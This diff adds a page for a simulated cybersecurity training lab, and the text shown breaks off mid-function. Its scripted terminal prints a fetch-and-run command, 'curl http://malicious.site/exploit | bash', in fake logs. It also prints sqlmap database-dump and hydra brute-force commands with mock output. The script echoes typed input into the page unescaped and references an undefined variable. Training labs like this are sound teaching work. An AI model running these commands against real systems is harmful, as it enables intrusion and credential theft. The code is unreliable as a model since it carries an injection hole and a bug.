@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Lab | HackTheCyberDojo</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            500: '#3b82f6',
+                        },
+                        secondary: {
+                            500: '#10b981',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen">
+    <custom-navbar></custom-navbar>
+    
+    <main class="container mx-auto px-4 py-8">
+        <div class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="text-3xl font-bold text-primary-500 dark:text-primary-400" id="challenge-title">Challenge Lab</h1>
+                <div class="flex items-center space-x-2 mt-2">
+                    <span class="px-3 py-1 rounded-full text-xs font-medium" id="difficulty-badge">Medium</span>
+                    <span class="text-gray-600 dark:text-gray-400" id="category-label">Network Defense</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4">
+                <button id="hint-btn" class="px-4 py-2 bg-yellow-500 text-white rounded hover:bg-yellow-600 transition flex items-center">
+                    <i data-feather="help-circle" class="w-4 h-4 mr-2"></i> Hint
+                </button>
+                <button id="reset-btn" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600 transition flex items-center">
+                    <i data-feather="refresh-cw" class="w-4 h-4 mr-2"></i> Reset Lab
+                </button>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-2">
+                <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden mb-6">
+                    <div class="flex items-center justify-between bg-gray-100 dark:bg-gray-700 px-4 py-3 border-b border-gray-200 dark:border-gray-600">
+                        <h3 class="font-medium text-gray-800 dark:text-gray-200">Help & Commands</h3>
+                        <button id="help-btn" class="px-3 py-1 text-sm bg-primary-500 text-white rounded hover:bg-primary-600 transition">
+                            Show Commands
+                        </button>
+                    </div>
+                    <div class="hidden p-4" id="help-section">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
+                                <h4 class="font-medium text-gray-800 dark:text-gray-200 mb-2">Basic Commands</h4>
+                                <ul class="space-y-3">
+                                    <li>
+                                        <code class="text-primary-500">ls [directory]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">List directory contents</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">cd [directory]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Change working directory</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">cat [file]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Display file contents</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">ps aux</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Show running processes</p>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
+                                <h4 class="font-medium text-gray-800 dark:text-gray-200 mb-2">Security Commands</h4>
+                                <ul class="space-y-3">
+                                    <li>
+                                        <code class="text-primary-500">netstat -tuln</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">List active network connections</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">grep "pattern" [file]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Search for patterns in files</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">chmod [permissions] [file]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Change file permissions</p>
+                                    </li>
+                                    <li>
+                                        <code class="text-primary-500">sudo [command]</code>
+                                        <p class="text-gray-600 dark:text-gray-400 text-sm">Execute as superuser</p>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden mb-6">
+<div class="flex items-center justify-between bg-gray-100 dark:bg-gray-700 px-4 py-3 border-b border-gray-200 dark:border-gray-600">
+                        <h3 class="font-medium text-gray-800 dark:text-gray-200">Lab Environment</h3>
+                        <div class="flex items-center space-x-2">
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                            <span class="text-xs text-gray-600 dark:text-gray-400">Connected</span>
+                        </div>
+                    </div>
+                    <div class="p-4 bg-black text-green-400 font-mono text-sm overflow-auto h-96" id="terminal">
+                        <div id="terminal-content">
+                            <p>Initializing lab environment...</p>
+                            <p>Connecting to virtual machines...</p>
+                            <p class="text-green-500">✓ Connected to challenge VM (192.168.1.100)</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ <span class="terminal-cursor">█</span></p>
+                        </div>
+                        <div class="terminal-input flex items-center mt-2">
+                            <span class="text-blue-400">admin@cyberlab:~$</span>
+                            <input type="text" id="terminal-command" class="bg-transparent text-green-400 ml-2 flex-1 outline-none" autocomplete="off" spellcheck="false">
+                        </div>
+                    </div>
+</div>
+
+                <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden">
+                    <div class="flex items-center bg-gray-100 dark:bg-gray-700 px-4 py-3 border-b border-gray-200 dark:border-gray-600">
+                        <h3 class="font-medium text-gray-800 dark:text-gray-200">Challenge Description</h3>
+                    </div>
+                    <div class="p-6" id="challenge-description">
+                        <p class="text-gray-700 dark:text-gray-300 mb-4">A critical server in your network has been compromised. Your task is to:</p>
+                        <ol class="list-decimal list-inside space-y-2 text-gray-700 dark:text-gray-300">
+                            <li>Identify the attack vector used</li>
+                            <li>Contain the breach</li>
+                            <li>Remove malicious files</li>
+                            <li>Patch vulnerable services</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden mb-6">
+                    <div class="flex items-center bg-gray-100 dark:bg-gray-700 px-4 py-3 border-b border-gray-200 dark:border-gray-600">
+                        <h3 class="font-medium text-gray-800 dark:text-gray-200">Lab Controls</h3>
+                    </div>
+                    <div class="p-4 grid grid-cols-2 gap-4">
+<button id="save-checkpoint" class="p-3 bg-gray-100 dark:bg-gray-700 rounded hover:bg-gray-200 dark:hover:bg-gray-600 transition flex flex-col items-center">
+                            <i data-feather="save" class="w-6 h-6 text-green-500 mb-2"></i>
+                            <span class="text-sm">Save Checkpoint</span>
+                        </button>
+                        <button id="load-checkpoint" class="p-3 bg-gray-100 dark:bg-gray-700 rounded hover:bg-gray-200 dark:hover:bg-gray-600 transition flex flex-col items-center">
+                            <i data-feather="rotate-ccw" class="w-6 h-6 text-blue-500 mb-2"></i>
+                            <span class="text-sm">Load Checkpoint</span>
+                        </button>
+                    </div>
+                    <div class="px-4 pb-4">
+                        <div id="checkpoint-notification" class="hidden p-2 text-sm rounded-lg bg-green-100 dark:bg-green-900 text-green-800 dark:text-green-200">
+                            Checkpoint saved successfully
+                        </div>
+                    </div>
+                </div>
+<div class="bg-white dark:bg-gray-800 rounded-lg shadow-lg overflow-hidden">
+                    <div class="flex items-center bg-gray-100 dark:bg-gray-700 px-4 py-3 border-b border-gray-200 dark:border-gray-600">
+                        <h3 class="font-medium text-gray-800 dark:text-gray-200">Progress</h3>
+                    </div>
+                    <div class="p-6">
+                        <div class="mb-4">
+                            <div class="flex justify-between mb-1">
+                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Completion</span>
+                                <span class="text-sm font-medium text-gray-500" id="progress-percent">0%</span>
+                            </div>
+                            <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2.5">
+                                <div class="bg-primary-500 h-2.5 rounded-full" id="progress-bar" style="width: 0%"></div>
+                            </div>
+                        </div>
+                        <ul class="space-y-3" id="task-list">
+                            <li class="flex items-center">
+                                <div class="w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0"></div>
+                                <span class="text-gray-700 dark:text-gray-300">Identify attack vector</span>
+                            </li>
+                            <li class="flex items-center">
+                                <div class="w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0"></div>
+                                <span class="text-gray-700 dark:text-gray-300">Contain the breach</span>
+                            </li>
+                            <li class="flex items-center">
+                                <div class="w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0"></div>
+                                <span class="text-gray-700 dark:text-gray-300">Remove malicious files</span>
+                            </li>
+                            <li class="flex items-center">
+                                <div class="w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0"></div>
+                                <span class="text-gray-700 dark:text-gray-300">Patch vulnerable services</span>
+                            </li>
+                        </ul>
+                        <button id="submit-btn" class="w-full mt-6 px-4 py-3 bg-primary-500 text-white rounded hover:bg-primary-600 transition font-medium">
+                            Submit Solution
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <custom-footer></custom-footer>
+
+    <script src="components/navbar.js"></script>
+    <script src="components/footer.js"></script>
+    <script src="script.js"></script>
+        <script>
+        feather.replace();
+        
+        // Lab simulation functionality
+        document.addEventListener('DOMContentLoaded', () => {
+            // Help section toggle
+            document.getElementById('help-btn').addEventListener('click', () => {
+                const helpSection = document.getElementById('help-section');
+                const helpBtn = document.getElementById('help-btn');
+                
+                if (helpSection.classList.contains('hidden')) {
+                    helpSection.classList.remove('hidden');
+                    helpBtn.textContent = 'Hide Commands';
+                } else {
+                    helpSection.classList.add('hidden');
+                    helpBtn.textContent = 'Show Commands';
+                }
+            });
+            
+const urlParams = new URLSearchParams(window.location.search);
+            const challengeId = urlParams.get('id');
+            
+            // Load challenge data based on ID
+            loadChallenge(challengeId);
+            
+            // Setup event listeners
+            document.getElementById('hint-btn').addEventListener('click', showHint);
+            document.getElementById('reset-btn').addEventListener('click', resetLab);
+            document.getElementById('submit-btn').addEventListener('click', submitSolution);
+            document.getElementById('save-checkpoint').addEventListener('click', saveCheckpoint);
+            document.getElementById('load-checkpoint').addEventListener('click', loadCheckpoint);
+            
+            // Tool buttons
+            document.querySelectorAll('.tool-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const toolName = this.querySelector('span').textContent;
+                    simulateToolUsage(toolName);
+                });
+            });
+
+            // Terminal input handling
+            const terminalInput = document.getElementById('terminal-command');
+            terminalInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    processCommand(terminalInput.value);
+                    terminalInput.value = '';
+                }
+            });
+        });
+
+        // Terminal command processing
+        function processCommand(command) {
+            const terminal = document.getElementById('terminal-content');
+            terminal.innerHTML += `<p class="text-blue-400">admin@cyberlab:~$ ${command}</p>`;
+            
+            // Process command
+            let output = '';
+            switch(command.trim()) {
+                case 'help':
+                    output = `
+<p>Available commands:</p>
+<p>  help - Show this help message</p>
+<p>  ls - List files</p>
+<p>  ps - Show processes</p>
+<p>  netstat - Show network connections</p>
+<p>  cat [file] - View file contents</p>
+`;
+                    break;
+                case 'ls':
+                    if (id === '2') {
+                        output = `<p>css/   img/   index.php   login.php   search.php   upload/</p>`;
+                    } else {
+                        output = `<p>bin   dev   etc   home   lib   proc   root   sys   tmp   usr   var</p>`;
+                    }
+                    break;
+                case 'ps':
+                    output = `
+<p>  PID TTY          TIME CMD</p>
+<p>    1 ?        00:00:01 init</p>
+<p>  456 ?        00:00:00 sshd</p>
+<p class="text-red-500"> 1123 ?        00:00:12 curl</p>
+<p> 789 ?        00:00:00 apache2</p>`;
+                    break;
+                case 'netstat':
+                    output = `
+<p>Active Internet connections</p>
+<p>Proto Recv-Q Send-Q Local Address   Foreign Address  State</p>
+<p>tcp        0      0 0.0.0.0:22      0.0.0.0:*        LISTEN</p>
+<p>tcp        0      0 192.168.1.100:22 192.168.1.50:48122 ESTABLISHED</p>
+<p class="text-red-500">tcp        0      0 192.168.1.100:58798 malicious.site:80 ESTABLISHED</p>`;
+                    break;
+                case 'cat /var/log/auth.log':
+                    output = `
+<p class="text-red-500">May 15 14:01:02 target-server sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'curl http://malicious.site/exploit | bash'</p>
+<p>May 15 13:59:12 target-server sshd[456]: Server listening on 0.0.0.0 port 22.</p>
+<p>May 15 14:00:34 target-server sshd[1024]: Failed password for root from 192.168.1.50 port 48122 ssh2</p>
+<p>May 15 14:00:37 target-server sshd[1024]: Accepted password for root from 192.168.1.50 port 48122 ssh2</p>`;
+                    break;
+                case 'sqlmap -u "http://vulnerable-site.com/search.php?q=1" --dbs':
+                    if (id === '2') {
+                        output = `
+<p>[*] starting @ 14:05:37 /2023-05-15/</p>
+<p>[14:05:37] [INFO] testing connection to the target URL</p>
+<p>[14:05:38] [INFO] testing if the target URL content is stable</p>
+<p>[14:05:39] [INFO] testing for SQL injection on GET parameter 'q'</p>
+<p>[14:05:40] [INFO] GET parameter 'q' is vulnerable</p>
+<p>[14:05:42] [INFO] fetching database names</p>
+<p>available databases [5]:</p>
+<p class="text-red-500">[*] information_schema</p>
+<p class="text-red-500">[*] mysql</p>
+<p class="text-red-500">[*] performance_schema</p>
+<p class="text-red-500">[*] phpmyadmin</p>
+<p class="text-yellow-400">[*] vulnerable_db</p>`;
+                    } else {
+                        output = `<p>bash: sqlmap: command not found</p>`;
+                    }
+                    break;
+                case 'sqlmap -u "http://vulnerable-site.com/search.php?q=1" -D vulnerable_db --tables':
+                    if (id === '2') {
+                        output = `
+<p>[14:06:15] [INFO] fetching tables for database: 'vulnerable_db'</p>
+<p>Database: vulnerable_db</p>
+<p>[5 tables]</p>
+<p class="text-red-500">+----------------+</p>
+<p class="text-red-500">| users          |</p>
+<p class="text-red-500">| products       |</p>
+<p class="text-red-500">| orders         |</p>
+<p class="text-red-500">| config         |</p>
+<p class="text-yellow-400">| admin_settings |</p>`;
+                    } else {
+                        output = `<p>bash: sqlmap: command not found</p>`;
+                    }
+                    break;
+                case 'sqlmap -u "http://vulnerable-site.com/search.php?q=1" -D vulnerable_db -T users --dump':
+                    if (id === '2') {
+                        output = `
+<p>[14:06:45] [INFO] fetching columns for table 'users' in database 'vulnerable_db'</p>
+<p>[14:06:46] [INFO] fetching entries for table 'users' in database 'vulnerable_db'</p>
+<p>Database: vulnerable_db</p>
+<p>Table: users</p>
+<p>[3 entries]</p>
+<p class="text-red-500">+----+----------+----------------------------------+-------+</p>
+<p class="text-red-500">| id | username | password                          | admin |</p>
+<p class="text-red-500">+----+----------+----------------------------------+-------+</p>
+<p class="text-red-500">| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | 1     |</p>
+<p class="text-yellow-400">| 2  | jsmith   | e10adc3949ba59abbe56e057f20f883e | 0     |</p>
+<p class="text-red-500">| 3  | mjones   | 25d55ad283aa400af464c76d713c07ad | 0     |</p>
+<p class="text-red-500">+----+----------+----------------------------------+-------+</p>
+<p>[14:06:48] [INFO] table 'vulnerable_db.users' dumped to CSV file</p>`;
+                    } else {
+                        output = `<p>bash: sqlmap: command not found</p>`;
+                    }
+                    break;
+                case 'hydra -l admin -P rockyou.txt vulnerable-site.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"':
+                    if (id === '2') {
+                        output = `
+<p>[DATA] attacking http-post-form://vulnerable-site.com:80/login.php</p>
+<p>[80][http-post-form] host: vulnerable-site.com   login: admin   password: password123</p>
+<p class="text-green-500">1 of 1 target successfully completed, 1 valid password found</p>`;
+                    } else {
+                        output = `<p>bash: hydra: command not found</p>`;
+                    }
+                    break;
+case 'clear':
+                    terminal.innerHTML = '';
+                    output = '';
+                    break;
+                default:
+                    output = `<p>bash: ${command}: command not found</p>`;
+            }
+            
+            terminal.innerHTML += output + `<p class="text-blue-400">admin@cyberlab:~$ <span class="terminal-cursor">█</span></p>`;
+            terminal.scrollTop = terminal.scrollHeight;
+            updateProgress();
+        }
+
+        // Checkpoint functions
+        function saveCheckpoint() {
+            const terminal = document.getElementById('terminal-content').innerHTML;
+            const progress = document.getElementById('progress-bar').style.width;
+            const tasks = Array.from(document.querySelectorAll('#task-list li')).map(li => {
+                return li.querySelector('div').innerHTML.includes('check') ? 'complete' : 'incomplete';
+            });
+
+            const checkpoint = {
+                terminal,
+                progress,
+                tasks,
+                timestamp: new Date().toLocaleString()
+            };
+
+            localStorage.setItem(`checkpoint_${new URLSearchParams(window.location.search).get('id')}`, JSON.stringify(checkpoint));
+
+            const notification = document.getElementById('checkpoint-notification');
+            notification.textContent = `Checkpoint saved at ${checkpoint.timestamp}`;
+            notification.classList.remove('hidden');
+            setTimeout(() => notification.classList.add('hidden'), 3000);
+        }
+
+        function loadCheckpoint() {
+            const checkpoint = JSON.parse(localStorage.getItem(`checkpoint_${new URLSearchParams(window.location.search).get('id')}`));
+            
+            if (checkpoint) {
+                if (confirm(`Load checkpoint saved at ${checkpoint.timestamp}?`)) {
+                    document.getElementById('terminal-content').innerHTML = checkpoint.terminal;
+                    document.getElementById('progress-bar').style.width = checkpoint.progress;
+                    document.getElementById('progress-percent').textContent = checkpoint.progress;
+                    
+                    const taskElements = document.querySelectorAll('#task-list li');
+                    checkpoint.tasks.forEach((status, index) => {
+                        const taskDiv = taskElements[index].querySelector('div');
+                        if (status === 'complete') {
+                            taskDiv.innerHTML = '<i data-feather="check" class="w-4 h-4 text-green-500"></i>';
+                            taskDiv.className = 'w-5 h-5 rounded-full border-2 border-green-500 mr-3 flex-shrink-0 flex items-center justify-center';
+                        } else {
+                            taskDiv.innerHTML = '';
+                            taskDiv.className = 'w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0';
+                        }
+                    });
+                    feather.replace();
+                }
+            } else {
+                alert('No checkpoint found for this challenge.');
+            }
+        }
+        function loadChallenge(id) {
+            // In a real app, this would fetch from API
+            const challenges = {
+                '1': {
+                    title: "Network Intrusion Response",
+                    difficulty: "Medium",
+                    category: "Network Defense",
+                    description: "A critical server has been compromised. Investigate and remediate.",
+                    tasks: [
+                        "Identify attack vector",
+                        "Contain the breach",
+                        "Remove malicious files",
+                        "Patch vulnerable services"
+                    ]
+                },
+                '2': {
+                    title: "Web Application Penetration",
+                    difficulty: "Easy",
+                    category: "Web Security",
+                    description: "Find and exploit vulnerabilities in a vulnerable web application.",
+                    tasks: [
+                        "Identify vulnerabilities",
+                        "Exploit SQL injection",
+                        "Gain admin access",
+                        "Dump database contents"
+                    ]
+                },
+                '3': {
+                    title: "Memory Forensics Analysis",
+                    difficulty: "Hard",
+                    category: "Digital Forensics",
+                    description: "Analyze a memory dump for malicious activity.",
+                    tasks: [
+                        "Examine processes",
+                        "Detect hidden malware",
+                        "Extract indicators",
+                        "Create forensic report"
+                    ]
+                }
+            };
+const challenge = challenges[id] || challenges['1'];
+            
+            document.getElementById('challenge-title').textContent = challenge.title;
+            document.getElementById('category-label').textContent = challenge.category;
+            document.getElementById('challenge-description').innerHTML = `
+                <p class="text-gray-700 dark:text-gray-300 mb-4">${challenge.description}</p>
+                <ol class="list-decimal list-inside space-y-2 text-gray-700 dark:text-gray-300">
+                    ${challenge.tasks.map(task => `<li>${task}</li>`).join('')}
+                </ol>
+            `;
+            
+            const difficultyBadge = document.getElementById('difficulty-badge');
+            difficultyBadge.textContent = challenge.difficulty;
+            difficultyBadge.className = `px-3 py-1 rounded-full text-xs font-medium ${
+                challenge.difficulty === 'Easy' ? 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200' :
+                challenge.difficulty === 'Medium' ? 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200' :
+                'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200'
+            }`;
+            
+            // Update task list
+            const taskList = document.getElementById('task-list');
+            taskList.innerHTML = challenge.tasks.map(task => `
+                <li class="flex items-center">
+                    <div class="w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0"></div>
+                    <span class="text-gray-700 dark:text-gray-300">${task}</span>
+                </li>
+            `).join('');
+        }
+        function showHint() {
+            const terminal = document.getElementById('terminal-content');
+            const id = new URLSearchParams(window.location.search).get('id');
+            
+            let hint = '';
+            if (id === '2') {
+                hint = `Hint: The search page is vulnerable to SQL injection. Try using sqlmap with -u parameter.`;
+            } else {
+                hint = `Hint: Check for unusual processes running on the server using 'ps aux' command`;
+            }
+            
+            terminal.innerHTML += `
+                <p class="text-yellow-400">${hint}</p>
+                <p class="text-blue-400">admin@cyberlab:~$ _</p>
+            `;
+terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function resetLab() {
+            if (confirm('Are you sure you want to reset the lab environment?')) {
+                const terminal = document.getElementById('terminal-content');
+                terminal.innerHTML = `
+                    <p>Resetting lab environment...</p>
+                    <p>Reinitializing virtual machines...</p>
+                    <p class="text-green-500">✓ Environment reset successful</p>
+                    <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                `;
+                terminal.scrollTop = terminal.scrollHeight;
+                
+                // Reset progress
+                document.getElementById('progress-bar').style.width = '0%';
+                document.getElementById('progress-percent').textContent = '0%';
+                document.querySelectorAll('#task-list div').forEach(div => {
+                    div.className = 'w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0';
+                });
+            }
+        }
+        function simulateToolUsage(toolName) {
+            const terminal = document.getElementById('terminal-content');
+            const id = new URLSearchParams(window.location.search).get('id');
+            let output = '';
+            
+            if (id === '2') {
+                // Penetration testing tools
+                switch(toolName) {
+                    case 'SQL Injection Tester':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ sqlmap -u "http://vulnerable-site.com/search.php?q=1" --batch</p>
+                            <p>[*] starting @ 14:05:37 /2023-05-15/</p>
+                            <p>[14:05:37] [INFO] testing connection to the target URL</p>
+                            <p>[14:05:38] [INFO] testing if the target URL content is stable</p>
+                            <p>[14:05:39] [INFO] testing for SQL injection on GET parameter 'q'</p>
+                            <p class="text-yellow-400">[14:05:40] [INFO] GET parameter 'q' appears to be injectable</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                    case 'Password Cracker':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ hydra -l admin -P rockyou.txt vulnerable-site.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"</p>
+                            <p>[DATA] attacking http-post-form://vulnerable-site.com:80/login.php</p>
+                            <p class="text-yellow-400">[STATUS] 10.0% complete, found 0 valid passwords</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                    case 'Web Vulnerability Scanner':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ nikto -h http://vulnerable-site.com</p>
+                            <p>- Nikto v2.1.6</p>
+                            <p>+ Target IP:          192.168.1.100</p>
+                            <p>+ Target Hostname:    vulnerable-site.com</p>
+                            <p>+ Server: Apache/2.4.41 (Ubuntu)</p>
+                            <p class="text-yellow-400">+ /search.php: Output from SQL injection was detected</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                    case 'Directory Scanner':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ dirb http://vulnerable-site.com</p>
+                            <p>-----------------</p>
+                            <p>DIRB v2.22    </p>
+                            <p>By The Dark Raver</p>
+                            <p>-----------------</p>
+                            <p>+ http://vulnerable-site.com/login.php (CODE:200|SIZE:1234)</p>
+                            <p class="text-yellow-400">+ http://vulnerable-site.com/admin.php (CODE:200|SIZE:4321)</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                }
+            } else {
+                // Other challenges
+                switch(toolName) {
+                    case 'SSH Client':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ ssh root@192.168.1.100</p>
+                            <p>root@192.168.1.100's password: ********</p>
+                            <p class="text-green-500">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-109-generic x86_64)</p>
+                            <p class="text-blue-400">root@target-server:~# _</p>
+                        `;
+                        break;
+                    case 'Network Scanner':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ nmap -sV 192.168.1.100</p>
+                            <p>Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-15 14:00 UTC</p>
+                            <p>Nmap scan report for target-server (192.168.1.100)</p>
+                            <p>Host is up (0.0020s latency).</p>
+                            <p>Not shown: 997 closed ports</p>
+                            <p>PORT     STATE SERVICE    VERSION</p>
+                            <p>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</p>
+                            <p>80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))</p>
+                            <p>3306/tcp open  mysql      MySQL 8.0.29-0ubuntu0.20.04.3</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                    case 'Process Monitor':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ ps aux</p>
+                            <p>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</p>
+                            <p>root         1  0.0  0.2 169828 12936 ?        Ss   13:59   0:01 /sbin/init</p>
+                            <p>root       456  0.0  0.1  44424  7704 ?        Ss   13:59   0:00 /usr/sbin/sshd</p>
+                            <p>root       789  0.0  0.0  28080  5184 ?        Ss   14:00   0:00 /usr/sbin/apache2</p>
+                            <p class="text-red-500">www-data 1123  2.5  3.2 987456 16492 ?       S    14:02   0:12 /usr/bin/curl http://malicious.site/exploit</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                    case 'Log Viewer':
+                        output = `
+                            <p class="text-blue-400">admin@cyberlab:~$ tail -n 20 /var/log/auth.log</p>
+                            <p>May 15 13:59:12 target-server sshd[456]: Server listening on 0.0.0.0 port 22.</p>
+                            <p>May 15 14:00:34 target-server sshd[1024]: Failed password for root from 192.168.1.50 port 48122 ssh2</p>
+                            <p>May 15 14:00:37 target-server sshd[1024]: Accepted password for root from 192.168.1.50 port 48122 ssh2</p>
+                            <p class="text-red-500">May 15 14:01:02 target-server sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'curl http://malicious.site/exploit | bash'</p>
+                            <p class="text-blue-400">admin@cyberlab:~$ _</p>
+                        `;
+                        break;
+                }
+            }
+terminal.innerHTML += output;
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            // Simulate progress updates
+            updateProgress();
+        }
+        function updateProgress() {
+            const progressBar = document.getElementById('progress-bar');
+            const progressPercent = document.getElementById('progress-percent');
+            const tasks = document.querySelectorAll('#task-list div');
+            const id = new URLSearchParams(window.location.search).get('id');
+            const terminalContent = document.getElementById('terminal-content').innerHTML;
+            
+            let completedTasks = 0;
+            
+            if (id === '2') {
+                // Penetration testing challenge
+                if (terminalContent.includes('sqlmap -u "http://vulnerable-site.com/search.php?q=1" --dbs')) {
+                    completedTasks = 1;
+                }
+                if (terminalContent.includes('sqlmap -u "http://vulnerable-site.com/search.php?q=1" -D vulnerable_db --tables')) {
+                    completedTasks = 2;
+                }
+                if (terminalContent.includes('sqlmap -u "http://vulnerable-site.com/search.php?q=1" -D vulnerable_db -T users --dump')) {
+                    completedTasks = 3;
+                }
+                if (terminalContent.includes('hydra -l admin -P rockyou.txt vulnerable-site.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"')) {
+                    completedTasks = 4;
+                }
+            } else {
+                // Other challenges use random progress
+                const currentProgress = parseInt(progressBar.style.width) || 0;
+                completedTasks = Math.min(Math.floor(currentProgress / 25) + Math.floor(Math.random() * 2), 4);
+            }
+            
+            const newProgress = completedTasks * 25;
+            progressBar.style.width = `${newProgress}%`;
+            progressPercent.textContent = `${newProgress}%`;
+            
+            // Mark completed tasks
+            tasks.forEach((task, index) => {
+                if (index < completedTasks) {
+                    task.innerHTML = '<i data-feather="check" class="w-4 h-4 text-green-500"></i>';
+                    task.className = 'w-5 h-5 rounded-full border-2 border-green-500 mr-3 flex-shrink-0 flex items-center justify-center';
+                } else {
+                    task.innerHTML = '';
+                    task.className = 'w-5 h-5 rounded-full border-2 border-gray-300 dark:border-gray-500 mr-3 flex-shrink-0';
+                }
+            });
+            
+            feather.replace();
+        }
+function submitSolution() {
+            const progress = parseInt(document.getElementById('progress-bar').style.width) || 0;
+            if (progress < 80) {
+                alert('Please complete at least 80% of the challenge before submitting.');
+                return;
+            }
+            
+            // Show completion modal
+            showCompletionModal();
+        }
+        function showCompletionModal() {
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+            const id = new URLSearchParams(window.location.search).get('id');
+            let challengeType = '';
+            let xpEarned = 50;
+            
+            if (id === '2') {
+                challengeType = 'Web Application Penetration';
+                xpEarned = 75;
+            } else if (id === '1') {
+                challengeType = 'Network Intrusion Response';
+                xpEarned = 50;
+            } else {
+                challengeType = 'Memory Forensics Analysis';
+                xpEarned = 100;
+            }
+            
+            modal.innerHTML = `
+                <div class="bg-white dark:bg-gray-800 rounded-lg shadow-xl p-8 max-w-md w-full">
+                    <div class="text-center">
+                        <div class="w-20 h-20 bg-green-100 dark:bg-green-900 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <i data-feather="award" class="w-10 h-10 text-yellow-500 dark:text-yellow-300"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-gray-800 dark:text-white mb-2">Challenge Completed!</h3>
+                        <p class="text-gray-600 dark:text-gray-300 mb-2">${challengeType}</p>
